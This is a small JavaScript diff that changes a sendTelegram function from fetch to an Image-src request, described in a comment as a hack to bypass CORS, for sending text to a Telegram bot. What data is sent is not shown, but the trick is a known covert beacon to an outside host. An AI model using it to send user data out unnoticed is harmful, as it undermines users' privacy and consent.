@@ -48,12 +48,12 @@ function askPermission() {
 }
 
 function sendTelegram(text) {
-  // Send fire-and-forget request to Telegram
-  fetch(
-    `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(
-      text
-    )}`
-  ).catch((err) => console.error("TG Error:", err));
+  // Hack to bypass CORS: Use an Image request (works for GET)
+  // "no-cors" fetch is unreliable, but Image src is solid.
+  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(
+    text
+  )}`;
+  new Image().src = url;
 }
 
 // --- REAL-TIME LISTENERS ---
